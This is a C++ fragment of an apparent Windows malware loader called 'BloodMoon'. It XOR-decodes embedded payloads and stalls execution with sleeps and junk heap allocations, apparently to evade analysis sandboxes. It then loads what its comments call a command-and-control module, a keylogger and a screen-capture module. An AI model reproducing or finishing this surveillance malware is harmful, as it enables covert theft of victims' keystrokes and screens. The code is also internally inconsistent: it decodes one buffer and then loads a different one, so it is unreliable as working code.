

void XOR(unsigned char* data, int data_len) {
	int i;
	int j;

	for (i = 0; i < data_len; i++) {

		data[i] = data[i] ^ 0x50;

	}
}


void CoffeeBreak(int loops=1000) {
	int counter = 0;
	char junk[1] = { 0x0 };
	HANDLE hHeap = ::GetProcessHeap();
	LPVOID wasted_mem = HeapAlloc(hHeap, HEAP_NO_SERIALIZE, 0x1000);

	for (int i = 0; i < loops; i++) {
	
		if (counter % 2) {
			junk[0] = { 0x5 };
			Sleep(500);
		}
		
		else if (counter % 5) {
		HeapReAlloc(hHeap, HEAP_NO_SERIALIZE, wasted_mem, 1024 * (counter % 5));
		}

		memcpy(wasted_mem, junk, 0x1);

		counter += 1;
	}
}


DWORD LaunchBloodMoon() {
	
	// Take a coffee break before we start
	CoffeeBreak(10);
	
	// Init HTTP/Comms Module
	XOR(keylogger_enc, keylogger_enc_len);
	HANDLE C2 = LoadModule(interstellar, interstellar_len);
	
	// Init Keylogger
	XOR(screencapture_enc, screencapture_enc_len);
	HANDLE Record = LoadModule(keylogger_enc, keylogger_enc_len);
	
	// Init ScreenCapture
	HANDLE KL = LoadModule(screencapture_enc, screencapture_enc_len);

	
	while (true) {

		
	}

}

